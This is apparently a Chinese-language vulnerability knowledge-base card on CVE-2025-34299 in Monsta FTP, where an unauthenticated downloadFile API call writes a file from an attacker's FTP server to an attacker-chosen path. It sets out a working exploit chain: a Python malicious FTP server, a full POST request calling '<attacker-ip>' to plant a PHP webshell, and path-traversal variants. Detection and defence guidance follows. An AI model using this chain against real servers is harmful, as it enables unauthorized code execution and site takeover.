---
id: web-generic-file-upload-monsta-ftp-unauth-download-write
title: Monsta FTP 未授权 downloadFile 从攻击者 FTP 下载并写入任意 localPath 落地 webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: unauth-ftp-download-arbitrary-local-write
tags:
- monsta-ftp
- ftp
- arbitrary-file-write
- webshell
- unauthenticated
- php
- ssrf
cve:
- CVE-2025-34299
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:13:52+08:00'
  notes: 已对照原文与9张图片核对：api.php 直接 json_decode(['request']) 并按 actionName 进入 RequestDispatcher；downloadFile 在 dispatch 白名单内；connectAndAuthenticate 使用请求中的 FTP host/port/user/pass（非Web登录）；FTPConnection::handleDownloadFile 调用 @ftp_get 写入 localPath。图09实测 POST /application/api/api.php 返回 {"success":true,"data":null}，但原文未截图验证 shell 落地/执行，故 medium 合适，卡内已注明该未验证点。原文未给受影响版本，未设 affected_versions；frontmatter无sources/source_url。PoC未本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-monsta-ftp-unauth-download-write/
draft: false
kb_aliases:
- CVE-2025-34299
- Monsta FTP RCE
- downloadFile 任意文件写入
- localPath webshell
---

## 一句话结论

Monsta FTP 的公开 API `application/api/api.php` 未做 Web 侧鉴权就允许调用 `downloadFile`，而该动作把攻击者提供的 FTP 连接配置和 `context.localPath` 直接用于 `ftp_get` 写文件；攻击者用自己的 FTP 服务器托管 PHP 文件并指定写入路径，即可在目标主机落地任意文件（构造得当即为 webshell）。原文实测返回 `{"success": true, "data": null}`，但未截图验证 shell 执行。

## 原理

- 入口 `application/api/api.php` 直接 `json_decode($_POST['request'])`，按 `actionName` 分流；`downloadFile` 不在 `$skipConfigurationActions` 中，但也不存在任何登录/会话校验，请求可匿名提交。
- `RequestMarshaller::marshallRequest()` 对非 `putFileContents`/`getFileContents` 的动作调用 `RequestDispatcher::dispatchRequest($actionName, $context)`。
- `dispatchRequest()` 用 `in_array($actionName, [...])` 做动作白名单，`downloadFile` 在名单内，随后执行 `return $this->$actionName($context)`。这里 `$actionName` 来自请求但受白名单约束，等价于暴露了整套文件操作动作。
- `RequestDispatcher::downloadFile($context)` 先调用 `connectAndAuthenticate()`。注意这是“连接 FTP 服务器”的认证，使用 `configuration` 中的 host/port/username/password，与 Monsta FTP 自身的 Web 登录无关；攻击者自己控制 FTP，所以认证必然通过。
- 之后 `ConnectionBase::downloadFile()` → `FTPConnection::handleDownloadFile()` 执行 `@ftp_get`，把远端文件写到 `context.localPath`。代码路径中没有把 `localPath` 限制在临时目录、没有校验扩展名、也没有限制目录穿越，因此写入位置由攻击者决定。
- 危害成立的关键：文件内容完全由攻击者的 FTP 提供，写盘路径也由攻击者提供，二者都不受信任；只要 PHP 进程对某个 Web 可访问目录有写权限，就能落地可执行脚本。

## 触发条件

- 目标运行受 CVE-2025-34299 影响的 Monsta FTP，`/application/api/api.php` 可从外部访问；
- 目标主机允许向攻击者地址发起出站 FTP 连接（默认端口任意，攻击者可自选，如 2121）；
- PHP 进程对目标写入目录有写权限，且该目录可被 Web 访问（或能通过目录穿越写到此类目录）；
- 攻击者能提供 FTP 服务并设置可读账号。

## 利用步骤

1. 在公网主机启动恶意 FTP，根目录放置 `shell.php`（内容为 `<?php phpinfo(); ?>` 或实际 webshell），创建 `test/test` 账号。
2. 向 `/application/api/api.php` 发送 POST，`request` 参数为 JSON：`actionName=downloadFile`、`connectionType=ftp`、`configuration` 指向恶意 FTP、`context.remotePath` 与 `context.localPath` 指定要下载的文件和落盘路径。
3. 服务端连接恶意 FTP、认证、下载并写入 `localPath`，响应 `{"success": true, "data": null}`。
4. 若 `localPath` 落在 Web 根目录或以相对路径/穿越形式写入可解析目录，直接访问该 PHP 文件执行代码。

## PoC

恶意 FTP（最小实现）：

```python
import os
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

root = "/tmp/evilftp"; os.makedirs(root, exist_ok=True)
open(os.path.join(root, "shell.php"), "w").write("<?php phpinfo(); ?>")

auth = DummyAuthorizer()
auth.add_user("test", "test", root, perm="elradfmw")
h = FTPHandler; h.authorizer = auth
FTPServer(("0.0.0.0", 2121), h).serve_forever()
```

请求：

```
POST /application/api/api.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

request={"actionName":"downloadFile","connectionType":"ftp","configuration":{"host":"<attacker-ip>","port":2121,"username":"test","password":"test"},"context":{"remotePath":"shell.php","localPath":"shell.php"}}
```

响应示例：`{"success": true, "data": null}`。随后访问落盘路径验证执行。

## 变体与关联

- 变体：`connectionType` 还支持 mftp/sftp/phps eclib 等实现（由部署的扩展决定），可换成对应协议投递文件；`localPath` 可用相对路径或 `../` 穿越到 Web 根目录。
- 变体：白名单同时暴露 `uploadFile`、`putFileContents`、`createZip`、`extractArchive` 等动作，均可匿名调用，可组合成写文件/解压落盘链。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]、[[web-generic-file-upload-unauth-object-storage-overwrite]]（同为无鉴权写入导致的 webshell 落地）。
- 局限：原文只验证到写文件成功（HTTP 200 + success），未展示访问 shell 执行；实际落地位置取决于部署的工作目录/权限，故 confidence 记为 medium。

## 检测与防御

- 检测：`/application/api/api.php` 的匿名 POST，`request` 中出现 `downloadFile`、`localPath`、外部 IP 的 `configuration.host`；Monsta FTP 主机向陌生地址发起 FTP 出站连接（2121/21 等）；Web 根目录出现新 PHP 文件。
- 升级：安装修复 CVE-2025-34299 的版本；无法升级时在反向代理层禁止匿名访问 `application/api/api.php`，或仅允许已认证会话。
- 配置：限制服务器出站连接（禁止到任意外部 FTP）；以低权限、非 Web 根目录运行 PHP；`localPath` 若业务不需要任意路径，应在代理/WAF 层拦截 `..` 和绝对路径。
- 架构：Monsta FTP 直连外部 FTP 的下载动作应改为服务端中转并强制写入隔离临时目录，禁止用户控制最终落盘路径。
